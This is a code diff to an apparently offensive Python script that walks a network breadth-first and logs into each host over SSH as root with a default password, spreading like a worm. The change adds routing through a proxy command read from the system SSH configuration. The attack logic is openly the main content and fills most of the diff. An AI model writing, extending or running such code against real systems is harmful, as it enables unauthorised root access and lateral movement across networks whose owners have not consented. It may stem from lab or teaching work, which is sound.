@@ -95,7 +95,7 @@ def get_host_port(data):
     args[1] = int(args[1])
     return args
 
-def begin_attack(client):
+def begin_attack(client, host):
     print "Beginning attack"
 
     # executes BFS over network
@@ -104,7 +104,7 @@ def begin_attack(client):
         server = q.get()
         verbose("Connecting to ssh host %s:%d ..." % (server.host, server.ssh_port))
         try:
-            client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
+            client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS, sock=paramiko.ProxyCommand(host.get("proxycommand")))
         except Exception as e:
             print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
             q.put(server)
@@ -137,6 +137,10 @@ def begin_attack(client):
 
 if __name__ == "__main__":
     # init paramiko
+    conf = paramiko.SSHConfig()
+    conf.parse(open(os.path.expanduser("/etc/ssh/ssh_config")))
+    host = conf.lookup(ROOT)
+
     client = paramiko.SSHClient()
     client.load_system_host_keys()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -154,7 +158,7 @@ if __name__ == "__main__":
         q.put(compObj)
 
     try:
-        begin_attack(client)
+        begin_attack(client, host)
     except KeyboardInterrupt:
         for t in threading.enumerate():
             pass
